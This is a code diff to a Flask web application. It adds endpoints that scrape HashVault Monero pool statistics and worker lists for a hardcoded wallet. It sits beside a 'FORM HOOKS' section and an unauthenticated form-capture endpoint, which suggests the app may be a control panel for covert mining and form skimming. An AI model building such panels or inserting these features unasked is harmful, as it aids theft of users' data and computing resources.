@@ -4965,6 +4965,113 @@ def ws_command(data):
 
 # ──────────────────────── FORM HOOKS ────────────────────────
 
+@app.route("/api/hashvault/stats")
+@login_required
+def hashvault_stats():
+    """Get HashVault pool stats for configured wallet."""
+    try:
+        import requests
+        
+        WALLET = '44haKQM5F43d37q3k6mV45YbrL5g6wGHWNB5uyt2cDfTdR8d9FicJCbitjm1xeKZzEVULG7MqdVFWEa9wKXsNLTpFvzffR5'
+        
+        # Try to get stats from HashVault page
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+        }
+        
+        # Get the miner page
+        response = requests.get(
+            f'https://hashvault.pro/xmr/en?user={WALLET}',
+            headers=headers,
+            timeout=10
+        )
+        
+        if response.status_code != 200:
+            return jsonify({"error": "Pool unavailable", "status": "offline"}), 503
+        
+        # Parse stats from HTML (HashVault embeds data in page)
+        import re
+        html = response.text
+        
+        # Extract hashrate
+        hashrate_match = re.search(r'hashrate["\']?\s*:\s*["\']?([\d.]+)', html)
+        hashrate = float(hashrate_match.group(1)) if hashrate_match else 0
+        
+        # Extract workers count
+        workers_match = re.search(r'workers["\']?\s*:\s*(\d+)', html)
+        workers = int(workers_match.group(1)) if workers_match else 0
+        
+        # Extract paid
+        paid_match = re.search(r'amtPaid["\']?\s*:\s*([\d.]+)', html)
+        paid = float(paid_match.group(1)) if paid_match else 0
+        
+        # Extract pending
+        pending_match = re.search(r'amtDue["\']?\s*:\s*([\d.]+)', html)
+        pending = float(pending_match.group(1)) if pending_match else 0
+        
+        return jsonify({
+            "status": "ok",
+            "wallet": WALLET,
+            "hashrate": hashrate,
+            "workers": workers,
+            "paid": paid,
+            "pending": pending,
+            "pool_url": f"https://hashvault.pro/xmr/en?user={WALLET}"
+        })
+        
+    except Exception as e:
+        log.error(f"[HashVault] Error: {e}")
+        return jsonify({"error": str(e), "status": "error"}), 500
+
+@app.route("/api/hashvault/workers")
+@login_required
+def hashvault_workers():
+    """Get HashVault workers list."""
+    try:
+        import requests
+        
+        WALLET = '44haKQM5F43d37q3k6mV45YbrL5g6wGHWNB5uyt2cDfTdR8d9FicJCbitjm1xeKZzEVULG7MqdVFWEa9wKXsNLTpFvzffR5'
+        
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+        }
+        
+        response = requests.get(
+            f'https://hashvault.pro/xmr/en?user={WALLET}',
+            headers=headers,
+            timeout=10
+        )
+        
+        if response.status_code != 200:
+            return jsonify({"workers": [], "error": "Pool unavailable"}), 503
+        
+        # Parse workers from HTML
+        import re
+        html = response.text
+        
+        # Try to extract workers data
+        workers = []
+        
+        # Look for worker patterns in the HTML
+        worker_pattern = re.compile(r'worker["\']?\s*:\s*["\']([^"\']+)["\']', re.IGNORECASE)
+        for match in worker_pattern.finditer(html):
+            worker_id = match.group(1)
+            workers.append({
+                "id": worker_id,
+                "hashrate": 0,
+                "status": "unknown"
+            })
+        
+        return jsonify({
+            "workers": workers,
+            "count": len(workers)
+        })
+        
+    except Exception as e:
+        log.error(f"[HashVault Workers] Error: {e}")
+        return jsonify({"workers": [], "error": str(e)}), 500
+
 @app.route("/api/form-capture", methods=["POST"])
 def form_capture():
     """Capture form data from frontend hooks."""
